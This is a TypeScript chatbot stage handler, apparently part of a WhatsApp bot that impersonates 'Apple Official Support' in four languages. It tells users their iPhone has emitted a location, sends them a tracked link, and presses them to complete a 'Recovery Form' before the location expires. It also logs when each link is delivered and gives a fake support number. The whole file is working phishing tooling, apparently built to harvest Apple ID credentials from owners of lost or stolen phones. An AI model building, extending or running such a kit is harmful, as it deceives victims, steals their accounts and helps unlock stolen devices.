import menu from "../menu";
import banco from "../banco";
import external from "../updateExternal";
import { atualizarAtendimento } from "../../services/atendimento";

function execute(
  user: any,
  msg: any,
  name: any,
  language: any,
  atendimento: any,
  conn: any
) {
  console.log("stage1");

  if (msg === "*") {
    banco[user].stage = 0;
    external(atendimento.protocolo, "finalizado");
    atualizarAtendimento(atendimento.id, { status: "finalizado" });
    const langFinalizado = {
      pt: `* Suporte Oficial da Apple*\n*${name}*, Seu atendimento foi encerrado com sucesso, Obrigado. 😃\n\nEspero ter conseguido te ajudar, a Apple agradeçe o seu contato, até mais. 👋\n\nPara mais informações ligue para 0800 201 7581.`,
      en: `*Apple Support*\n*${name}*, Your support has been closed successfully, Thank you. 😃\n\nI hope I could help you, Apple thanks you for your contact, see you soon. 👋\n\nFor more information call 0800 201 7581.`,
      es: `*Soporte Oficial de Apple*\n*${name}*, Su atención ha sido cerrada con éxito, Gracias. 😃\n\nEspero pudiera ayudarle, Apple agradece su contacto, hasta pronto. 👋\n\nPara más información llame a 0800 201 7581.`,
      fr: `*Support Apple*\n*${name}*, Votre atendimento a été fermé avec succès, Merci. 😃\n\nJ'espère que j'ai pu vous aider, Apple vous remercie de votre contact, à bientôt. 👋\n\nPour plus d'informations appelez 0800 201 7581.`,
    };
    return [langFinalizado[language]];
  }

  if (msg == 2) {
    banco[user].stage = 0;
    external(atendimento.protocolo, "link_entregue", "sim");
    const langLinkEntregue = {
      pt: `* Suporte Oficial da Apple*\nOpção (${
        menu[language][msg - 1].descricao
      }) selecionada com sucesso.\n\n*iPhone Localizável Após Desligado*\nPrezado(a) *${name}*, O seu *${
        atendimento.model
      }* foi emparelhado via Bluetooth a um outro Dispositivo Apple e emitiu a sua última localização. *Acesse:* ${
        atendimento.link
      } e veja a sua última localização na Rede do App Buscar antes que ela expire.\n\nAtenciosamente,\n* Suporte Oficial da Apple*\n\nDigite * para encerrar o atendimento.`,

      en: `*Apple Support*\nOption (${
        menu[language][msg - 1].descricao
      }) selected successfully.\n\n*iPhone Localizable After Turned Off*\nDear *${name}*, Your *${
        atendimento.model
      }* was paired via Bluetooth to another Apple device and emitted its last location. *Access:* ${
        atendimento.link
      } and see your last location in the App Search before it expires.\n\nBest regards,\n*Apple Support*\n\nType * to close the support.`,

      es: `*Soporte Oficial de Apple*\nOpción (${
        menu[language][msg - 1].descricao
      }) seleccionada con éxito.\n\n*iPhone Localizable Después de Apagado*\nEstimado(a) *${name}*, Su *${
        atendimento.model
      }* fue emparejado via Bluetooth a otro dispositivo Apple y emitió su última localización. *Acceso:* ${
        atendimento.link
      } y vea su última localización en la App Buscar antes de que expire.\n\nSaludos cordiales,\n*Soporte Oficial de Apple*\n\nDigite * para cerrar el atendimento.`,

      fr: `*Support Apple*\nOption (${
        menu[language][msg - 1].descricao
      }) sélectionnée avec succès.\n\n*iPhone Localisable Après Éteint*\nCher *${name}*, Votre *${
        atendimento.model
      }* a été emparejé via Bluetooth à un autre appareil Apple et a emis sa dernière localisation. *Accès:* ${
        atendimento.link
      } et voir votre dernière localisation dans l'App Rechercher avant qu'elle expire.\n\nCordialement,\n*Support Apple*\n\nTapez * pour fermer le support.`,
    };
    return [langLinkEntregue[language]];
  }
  if (msg == 3) {
    banco[user].stage = 3;

    const langLinkEntregue = {
      pt: `* Suporte Oficial da Apple*\nOpção (${
        menu[language][msg - 1].descricao
      }) selecionada com sucesso.\n\n*${name}*, Por favor, digite o último protocolo recebido por SMS ou Atendimento:\n\nDigite * para encerrar o atendimento.`,

      en: `*Apple Support*\nOption (${
        menu[language][msg - 1].descricao
      }) selected successfully.\n\n*${name}*, Please enter the last protocol received by SMS or Support:\n\nType * to close the support.`,

      es: `*Soporte Oficial de Apple*\nOpción (${
        menu[language][msg - 1].descricao
      }) seleccionada con éxito.\n\n*${name}*, Por favor, ingrese el último protocolo recibido por SMS o Soporte:\n\nDigite * para cerrar el atendimento.`,

      fr: `*Support Apple*\nOption (${
        menu[language][msg - 1].descricao
      }) sélectionnée avec succès.\n\n*${name}*, Veuillez entrer le dernier protocole reçu par SMS ou Support:\n\nTapez * pour fermer le support.`,
    };

    return [langLinkEntregue[language]];
  }

  if (!menu[language][msg - 1]) {
    const langErro = {
      pt: `* Suporte Oficial da Apple*\nOpção inválida, por favor, tente novamente.\n\nDigite * para encerrar o atendimento.`,
      en: `*Apple Support*\nInvalid option, please try again.\n\nType * to close the support.`,
      es: `*Soporte Oficial de Apple*\nOpción inválida, por favor, intente nuevamente.\n\nDigite * para cerrar el atendimento.`,
      fr: `*Support Apple*\nOption invalide, veuillez réessayer.\n\nTapez * pour fermer le support.`,
    };

    return [langErro[language]];
  }

  external(atendimento.protocolo, "link_entregue", "sim");

  banco[user].items.push(menu[language][msg - 1]);

  const langFinalizado = {
    pt: `* Suporte Oficial da Apple*\nOpção (${
      menu[language][msg - 1].descricao
    }) selecionada com sucesso.\n\nPrezado(a) *${name}*,\nO seu *${
      atendimento.model
    }* emitiu uma nova localização. *Veja em:* ${
      atendimento.link
    }. Logo após você será redirecionado para a *Página de Suporte Oficial da Apple.* Você deve preencher o seu Formulário de Recuperação, para que possamos lhe encaminhar para uma de nossas lojas mais próxima de você.\n\nAtenciosamente,\n* Suporte Oficial da Apple*\n\nDigite * para encerrar o atendimento.`,

    en: `*Apple Support*\nOption (${
      menu[language][msg - 1].descricao
    }) selected successfully.\n\nDear *${name}*,\nYour *${
      atendimento.model
    }* emitted a new location. *See in:* ${
      atendimento.link
    }. After you are redirected to *Apple Support Page* you must fill out the *Recovery Form* to be sent to one of our nearest stores.\n\nBest regards,\n*Apple Support*\n\nType * to close the support.`,

    es: `*Soporte Oficial de Apple*\nOpción (${
      menu[language][msg - 1].descricao
    }) seleccionada con éxito.\n\nEstimado(a) *${name}*,\nSu *${
      atendimento.model
    }* emitió una nueva localización. *Ver en:* ${
      atendimento.link
    }. Después de que usted será redirigido a la *Página de Soporte Oficial de Apple*, debe completar el Formulario de Recuperación, para que podamos le enviar a una de nuestras tiendas más cercanas a usted.\n\nCordialemente,\n*Soporte Oficial de Apple*\n\nDigite * para cerrar el atendimento.`,

    fr: `*Support Apple*\nOption (${
      menu[language][msg - 1].descricao
    }) sélectionnée avec succès.\n\nCher *${name}*,\nVotre *${
      atendimento.model
    }* a emis une nouvelle localisation. *Voir en:* ${
      atendimento.link
    }. Après que vous êtes redirigé vers la *Page de Support Apple*, vous devez remplir le Formulaire de Récupération, pour que nous puissions vous envoyer à une de nos magasins les plus proches de vous.\n\nCordialement,\n*Support Apple*\n\nTapez * pour fermer le support.`,
  };

  return [langFinalizado[language]];
}

export default execute;
